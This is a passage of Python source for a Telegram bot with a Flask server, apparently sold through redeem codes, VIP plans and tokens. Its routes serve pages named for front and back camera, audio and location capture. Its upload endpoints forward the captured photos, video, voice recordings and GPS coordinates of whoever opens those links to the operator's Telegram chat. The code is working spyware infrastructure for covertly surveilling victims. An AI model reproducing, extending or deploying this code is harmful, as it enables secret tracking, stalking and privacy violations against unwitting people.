    if not message.text.isdigit(): return bot.send_message(message.chat.id, "❌ Number bhejein", reply_markup=get_admin_menu())
    days_count = int(message.text)
    code = f"AYUSH-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    db = load_db()
    db["redeem_codes"][code] = {"type": "unlimited", "days": days_count, "uses_left": users_count, "used_by": []}
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>Code: <code>{code}</code>\nUser: {users_count}\nDays: {days_count}\nToken: unlimited\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())


# --- DIRECT COMMANDS ---
@bot.message_handler(commands=['setvip'])
def set_vip_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        _, target_uid, days = message.text.split()
        db = load_db()
        if target_uid in db["users"]:
            db["users"][target_uid]["plan"] = "unlimited"
            db["users"][target_uid]["expiry"] = (datetime.now() + timedelta(days=int(days))).strftime("%Y-%m-%d %H:%M:%S")
            save_db(db)
            bot.reply_to(message, f"✅ VIP Added to {target_uid}")
    except Exception: pass

@bot.message_handler(commands=['addtokens'])
def add_tokens_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        _, target_uid, tokens = message.text.split()
        db = load_db()
        if target_uid in db["users"]:
            db["users"][target_uid]["tokens"] = db["users"][target_uid].get("tokens", 0) + int(tokens)
            save_db(db)
            bot.reply_to(message, f"✅ Tokens Added to {target_uid}")
    except Exception: pass


# ----------------- 9. FLASK SERVER ENDPOINTS -----------------
@app.route('/ayush-web')
def route_front(): return render_template('Front_camera.html')

@app.route('/ayush-web-1')
def route_back(): return render_template('Back_camera.html')

@app.route('/ayush-web-2')
def route_f8s(): return render_template('Front_8s.html')

@app.route('/ayush-web-3')
def route_b8s(): return render_template('Back_8s.html')

@app.route('/ayush-web-4')
def route_audio(): return render_template('Audio.html')

@app.route('/ayush-web-5')
def route_location(): return render_template('Location.html')

@app.route('/upload_media', methods=['POST'])
def receive_media():
    chat_id = request.form.get('chat_id')
    media_type = request.form.get('type')
    file = request.files.get('file')
    if chat_id and file:
        data = file.read()
        caption = f"<blockquote>✅ <b>Auto Captured Media Saved!</b>\n{DEV_TAG}</blockquote>"
        try:
            if media_type == 'photo': bot.send_photo(chat_id=chat_id, photo=data, caption=caption)
            elif media_type == 'video': bot.send_video(chat_id=chat_id, video=data, caption=caption)
            elif media_type == 'audio': bot.send_voice(chat_id=chat_id, voice=data, caption=caption)
            return "OK", 200
        except Exception as e: return "ERROR", 500
    return "FAIL", 400

@app.route('/upload_location', methods=['POST'])
def receive_location():
    chat_id = request.form.get('chat_id')
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    acc = request.form.get('accuracy')
    if chat_id and lat and lon:
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        loc_text = f"<blockquote>📍 <b>Live Location Received!</b>\n🌐 <b>Lat:</b> <code>{lat}</code>\n🌐 <b>Lon:</b> <code>{lon}</code>\n🗺️ <a href='{maps_url}'>Click to View</a>\n{DEV_TAG}</blockquote>"
        try:
            bot.send_location(chat_id=chat_id, latitude=float(lat), longitude=float(lon))
            bot.send_message(chat_id=chat_id, text=loc_text, disable_web_page_preview=False)
            return "OK", 200
        except Exception as e: return "ERROR", 500
    return "FAIL", 400


# ----------------- 10. RUN APPLICATION -----------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)).start()
    print(f"Flask Server Port {port} par start ho gaya...")
    bot.infinity_polling()